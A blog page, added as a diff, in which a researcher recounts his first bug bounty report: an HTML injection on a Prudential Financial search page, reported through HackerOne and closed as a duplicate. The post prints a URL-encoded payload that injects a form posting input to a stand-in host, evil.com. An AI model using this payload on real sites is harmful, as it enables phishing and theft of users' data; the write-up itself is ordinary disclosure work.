@@ -1,0 +1,345 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>First Bug Report: HTML Injection on Prudential Financial — Yousef Tamer</title>
+  <meta name="description" content="My first bug bounty experience discovering an HTML Injection vulnerability on Prudential Financial through HackerOne. Learn about the impact and findings." />
+  <meta name="keywords" content="Yousef Tamer, jooexploit, bug bounty, HTML injection, HackerOne, Prudential Financial, cybersecurity, ethical hacking" />
+  <meta name="theme-color" content="#09090B" />
+  <meta name="robots" content="index, follow" />
+  <link rel="canonical" href="https://jooexploit.dev/blog/first-bug-report-html-injection" />
+
+  
+
+  <!-- Security Headers -->
+  <meta http-equiv="Content-Security-Policy"
+    content="default-src 'self' https:; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https:;" />
+  <meta http-equiv="Referrer-Policy" content="no-referrer-when-downgrade" />
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://jooexploit.dev/blog/first-bug-report-html-injection" />
+  <meta property="og:title" content="First Bug Report: HTML Injection on Prudential Financial — Yousef Tamer" />
+  <meta property="og:description" content="My first bug bounty experience discovering an HTML Injection vulnerability on Prudential Financial through HackerOne. Learn about the impact and findings." />
+  <meta property="og:image" content="https://jooexploit.dev/images/og_preview.png" />
+  
+
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:url" content="https://jooexploit.dev/blog/first-bug-report-html-injection" />
+  <meta name="twitter:title" content="First Bug Report: HTML Injection on Prudential Financial — Yousef Tamer" />
+  <meta name="twitter:description" content="My first bug bounty experience discovering an HTML Injection vulnerability on Prudential Financial through HackerOne. Learn about the impact and findings." />
+  <meta name="twitter:image" content="https://jooexploit.dev/images/og_preview.png" />
+  <meta name="twitter:site" content="@jooexploit" />
+  <meta name="twitter:creator" content="@jooexploit" />
+
+  <!-- Favicon Package & PWA Manifest -->
+  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="manifest" href="/manifest.webmanifest" />
+
+  <!-- Fonts & Styles -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600;700&amp;family=Geist+Mono:wght@400;500&amp;display=swap"
+    rel="stylesheet" />
+  <link rel="stylesheet" href="/css/main.css" />
+
+  <!-- Structured Data (JSON-LD) -->
+  
+  <script type="application/ld+json">
+  {
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Person",
+      "@id": "https://jooexploit.dev/#person",
+      "name": "Yousef Tamer",
+      "alternateName": "jooexploit",
+      "jobTitle": "Senior DevOps & Cloud Engineer",
+      "url": "https://jooexploit.dev/",
+      "image": "https://jooexploit.dev/apple-touch-icon.png",
+      "address": {
+        "@type": "PostalAddress",
+        "addressCountry": "Egypt"
+      },
+      "sameAs": [
+        "https://github.com/jooexploit",
+        "https://gitlab.com/shoky",
+        "https://x.com/jooexploit",
+        "https://linkedin.com/in/jooexploit"
+      ],
+      "knowsAbout": [
+        "Computer Science",
+        "DevOps",
+        "Cloud Computing",
+        "Linux Systems",
+        "Infrastructure as Code",
+        "CI/CD Pipelines",
+        "Docker",
+        "Kubernetes",
+        "Terraform",
+        "Ansible",
+        "AWS",
+        "Azure",
+        "GCP",
+        "Python",
+        "Bash Scripting",
+        "Systems Security",
+        "Technology Education"
+      ]
+    },
+    {
+      "@type": "BlogPosting",
+      "@id": "https://jooexploit.dev/blog/first-bug-report-html-injection/#post",
+      "headline": "First Bug Report: HTML Injection Vulnerability 🔍",
+      "description": "My first bug bounty experience discovering an HTML Injection vulnerability on Prudential Financial through HackerOne. Learn about the impact and findings.",
+      "url": "https://jooexploit.dev/blog/first-bug-report-html-injection",
+      "datePublished": "2024-09-02",
+      "dateModified": "2024-09-02",
+      "author": {
+        "@id": "https://jooexploit.dev/#person"
+      },
+      "publisher": {
+        "@id": "https://jooexploit.dev/#person"
+      },
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://jooexploit.dev/blog/first-bug-report-html-injection/#webpage"
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://jooexploit.dev/blog/first-bug-report-html-injection/#breadcrumb",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://jooexploit.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://jooexploit.dev/blog"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "First Bug Report: HTML Injection Vulnerability 🔍",
+          "item": "https://jooexploit.dev/blog/first-bug-report-html-injection"
+        }
+      ]
+    }
+  ]
+}
+  </script>
+  
+  
+  
+</head>
+
+<body class="subpage">
+
+  <a class="skip-link" href="#main">Skip to content</a>
+
+  
+
+  <!-- Scroll progress -->
+  <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>
+
+  
+
+  <!-- Navigation -->
+  <header class="nav" id="nav">
+    <div class="nav__inner">
+      <a class="nav__logo" href="/" aria-label="Back to home">
+        <picture>
+          <source srcset="/images/logo.webp" type="image/webp" />
+          <img src="/images/logo.png" alt="jooexploit logo" class="nav__logo-img" width="240" height="160" />
+        </picture>
+      </a>
+      <nav class="nav__links" id="navLinks" aria-label="Primary navigation">
+        
+          <a href="/about" data-spy>About</a>
+        
+          <a href="/journey" data-spy>Journey</a>
+        
+          <a href="/certifications" data-spy>Certifications</a>
+        
+          <a href="/projects" data-spy>Work</a>
+        
+          <a href="/skills" data-spy>Skills</a>
+        
+          <a href="/library" data-spy>Library</a>
+        
+          <a href="/blog" class="is-active" data-spy>Blog</a>
+        
+      </nav>
+      <div class="nav__actions">
+        <a class="btn btn--primary btn--sm" href="/contact" id="nav-cta">Get in touch</a>
+        <button class="nav__toggle" id="navToggle" aria-expanded="false" aria-controls="navLinks"
+          aria-label="Toggle navigation menu">
+          <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M4 6h16" />
+            <path d="M4 12h16" />
+            <path d="M4 18h16" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <main id="main">
+    
+    <article class="section" aria-labelledby="post-title">
+      <div class="container" style="max-width: 860px;">
+
+        <header style="margin-bottom: 3rem;">
+          <div class="project-tag-wrap" style="margin-bottom: 1rem;">
+            <span class="tag mono">
+              Bug Bounty &middot; HTML Injection &middot; HackerOne
+            </span>
+          </div>
+          <h1 id="post-title" class="section__title"
+            style="font-size: 2.2rem; line-height: 1.2; margin-bottom: 1rem; color: var(--text);">
+            First Bug Report: HTML Injection Vulnerability 🔍
+          </h1>
+          <div class="project-metadata mono" style="margin-bottom: 2rem;">
+            <div class="meta-item"><span>Published</span><span>September 3, 2024</span></div>
+            <div class="meta-item"><span>Read Time</span><span>3 Min</span></div>
+            <div class="meta-item"><span>Author</span><span>Yousef Tamer</span></div>
+          </div>
+        </header>
+
+        
+        
+          <section class="post-content prose" dir="auto">
+            <h1 id="first-bug-report-html-injection-vulnerability">🔍 First Bug Report: HTML Injection Vulnerability 🕵️‍♂️</h1><p>I’m excited to share my first bug report experience with the community! 🚀</p>
+<p>Vulnerability: HTML Injection<br>Affected Site: <a href="https://www.prudential.com/common/findfinancialprofessional?type=bylocation&term=">Prudential Financial</a><br>Issue: Improper handling of user input allows for the injection of malicious HTML code.</p>
+<p>Details:<br>The vulnerability was found in the input field of the page. By injecting the following payload, an attacker could potentially manipulate content, steal user data, or phish users:</p>
+<div class="md-code-wrap"><pre><code>%3 C/strong%3 E%3 Cform%20 action=%22//evil.com%22%20 method=%22 GET%22%3 E%3 Cinput%20 type=%22 text%22%20 name=%22 jo%22%20 style=%27 opacity:0;%27%3 E%3 Cinput%20 type=%22 submit%22%20 name=%22 joo%22%20 value=%22 load%20 more%20 search%22%3 E
+</code></pre></div>
+<p>Impact:  </p>
+<ul>
+<li>Steal User Data: Capture sensitive user information.  </li>
+<li>Phishing:Trick users into entering personal information.  </li>
+<li>Content Manipulation: Alter page content or user interface.  </li>
+<li>XSS Risk:Potential for cross-site scripting attacks.</li>
+</ul>
+<p>Attachments: <a href="https://www.awesomescreenshot.com/video/30099441?key=d6ecba16732cedfe31c02affcec78f3e">Video Demonstration</a></p>
+<p>Outcome: The report was marked as a duplicate of an existing submission, but it was a valuable learning experience for me. Thanks to HackerOne for the feedback!</p>
+<p>Looking forward to diving into more security challenges and contributing to the community! 🌐💡<br>It&#39;s just beginning 🦦</p>
+<p>#BugBounty #WebSecurity #HTMLInjection #CyberSecurity #EthicalHacking</p>
+<p>Press enter or click to view image in full size</p>
+<figure class="md-figure"><img src="https://miro.medium.com/v2/resize:fit:700/1*Nro1XQEDgujrbajbNkSpDg.jpeg" alt=""></figure>
+<hr>
+
+          </section>
+        
+
+        <div style="margin-top: 4rem; border-top: 1px solid var(--border); padding-top: 2rem;">
+          <a class="btn btn--ghost" href="/blog" style="border: 1px solid var(--border);">Back to Blog</a>
+        </div>
+
+      </div>
+    </article>
+
+    <!-- MathJax & Mermaid libraries for rich post content -->
+    <script>
+      window.MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']],
+          processEscapes: true
+        },
+        options: {
+          ignoreHtmlClass: 'tex2jax_ignore',
+          processHtmlClass: 'tex2jax_process'
+        }
+      };
+    </script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    <script type="module">
+      import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+      mermaid.initialize({
+        startOnLoad: true,
+        theme: 'dark',
+        securityLevel: 'loose',
+        flowchart: { useMaxWidth: true, htmlLabels: true }
+      });
+    </script>
+
+    <!-- Contact Section -->
+    <section class="section contact" id="contact" aria-labelledby="contact-title">
+      <div class="container contact__inner">
+        <p class="section__index">04 &mdash; Contact</p>
+        <h2 class="contact__title" id="contact-title">
+          Interested in Bug Bounty?<br>Let's <em class="accent-em">collaborate</em>.
+        </h2>
+        <p class="contact__sub">
+          Open to security research discussions, responsible disclosure, and bug bounty mentoring.
+        </p>
+        <div class="contact__actions">
+          <a class="btn btn--primary btn--lg" href="mailto:youseftamereg@gmail.com" id="contact-email" data-magnetic>
+            <svg class="icon" viewBox="0 0 24 24" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2" /><path d="m22 7-10 6L2 7" /></svg>
+            youseftamereg@gmail.com
+          </a>
+          <div class="contact__social">
+            
+            <a class="btn btn--ghost" href="https://gitlab.com/shoky" id="contact-gitlab" target="_blank"
+              rel="me noopener noreferrer" aria-label="Visit Yousef Tamer's GitLab Profile">GitLab</a>
+            
+            <a class="btn btn--ghost" href="https://github.com/jooexploit" id="contact-github" target="_blank"
+              rel="me noopener noreferrer" aria-label="Visit Yousef Tamer's GitHub Profile">GitHub</a>
+            
+            <a class="btn btn--ghost" href="https://x.com/jooexploit" id="contact-x" target="_blank"
+              rel="me noopener noreferrer" aria-label="Visit Yousef Tamer's X Profile">X</a>
+            
+            <a class="btn btn--ghost" href="https://linkedin.com/in/jooexploit" id="contact-linkedin" target="_blank"
+              rel="me noopener noreferrer" aria-label="Visit Yousef Tamer's LinkedIn Profile">LinkedIn</a>
+            
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container footer__inner">
+      <div class="footer__logo-wrap">
+        <picture>
+          <source srcset="/images/logo.webp" type="image/webp" />
+          <img src="/images/logo.png" alt="jooexploit logo" class="footer__logo-img" width="240" height="160" />
+        </picture>
+        <span class="mono">&copy; <span id="year"></span></span>
+      </div>
+      <p class="footer__note">CS · DevOps · Cloud · Linux · Automation · Education</p>
+      <a href="#top" class="footer__top" id="footer-top" aria-label="Back to top">
+        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="m18 15-6-6-6 6" />
+        </svg>
+      </a>
+    </div>
+  </footer>
+
+  <!-- Scripts -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js"
+    crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@studio-freight/lenis@1.0.42/dist/lenis.min.js" crossorigin="anonymous"></script>
+  
+  <script src="/js/main.js"></script>
+
+</body>
+
+</html>
